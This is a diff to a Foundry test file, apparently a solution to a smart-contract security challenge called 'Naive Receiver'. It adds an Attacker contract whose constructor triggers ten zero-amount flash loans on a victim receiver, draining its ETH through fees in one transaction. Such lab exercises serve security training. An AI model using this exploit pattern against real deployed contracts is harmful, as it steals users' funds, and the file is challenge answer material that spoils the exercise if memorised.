@@ -49,9 +49,10 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
         // Todo: flashloan 10 times to drain receiver
-        for (uint256 i = 0; i < 10; i = i + 1) {
-            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
-        }
+        // for (uint256 i = 0; i < 10; i = i + 1) {
+        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        // }
+        new Attacker(naiveReceiverLenderPool, flashLoanReceiver);
 
         /**
          * EXPLOIT END *
@@ -64,5 +65,13 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract Attacker {
+    constructor(NaiveReceiverLenderPool naiveReceiverLenderPool, FlashLoanReceiver flashLoanReceiver) {
+        for (uint256 i = 0; i < 10; i = i + 1) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
     }
 }
